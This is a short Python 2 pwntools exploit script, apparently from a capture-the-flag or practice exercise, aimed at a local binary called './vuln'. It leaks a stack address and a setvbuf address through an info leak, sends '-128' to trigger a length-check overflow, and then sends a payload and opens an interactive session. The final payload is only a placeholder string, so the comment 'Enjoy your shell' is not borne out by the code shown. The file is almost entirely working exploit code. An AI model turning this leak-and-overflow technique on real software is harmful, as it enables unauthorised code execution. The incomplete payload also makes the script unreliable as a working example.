#Import pwntools
from pwn import *

#Establish the target process
target = process('./vuln')
gdb.attach(target)

#Prompt for input for a pasue
raw_input()

#Send the payload for the leak
leak_payload = "0"*16
print target.recvuntil("Enter username: ")
target.send(leak_payload)

#Scan in the infoleaks, filter them out, and calculate the needed address
leak = target.recvuntil("Enter length: ")
leak = leak.replace("Enter length: ", "")
setvbuf_adr = u32(leak[28:32]) - 11
stack_adr = u32(leak[20:24])
log.info("Address of setbuffer: " + hex(setvbuf_adr))
log.info("Stack leak: " + hex(stack_adr))

#Send -128 to allow a buffer overflow
target.sendline("-128")

#Form the payload to pop a shell, and send it
print target.recvuntil("Enter string (length 4294967168): ")
payload = "15935728"
target.sendline(payload)

#Enjoy your shell
target.interactive()
